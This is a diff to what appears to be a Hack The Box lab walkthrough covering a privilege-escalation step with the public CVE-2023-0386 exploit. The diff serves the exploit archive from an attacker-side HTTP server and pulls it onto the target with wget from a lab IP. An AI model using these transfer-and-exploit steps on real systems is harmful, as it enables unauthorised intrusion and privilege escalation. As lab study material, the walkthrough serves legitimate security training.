@@ -560,13 +560,15 @@ Search Exploit
 
 Github exploit
 https://github.com/sxlmnwb/CVE-2023-0386
+Download exploit as `zip`
 
 Get Exploit
 ```shell
 python m http.server
 ```
-
 ```shell
-wget http://10.10.14.23:8000/CVE-2023-0386
+wget http://10.10.14.23:8000/CVE-2023-0386-master.zip
 ```
-![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/782e49f8-b3a1-4852-8933-4dd5ed585848)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/71694b0c-b7fd-4628-8ef3-ef3b85322fa2)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5bfbed87-251a-451a-ac69-bec64abf3a46)
+
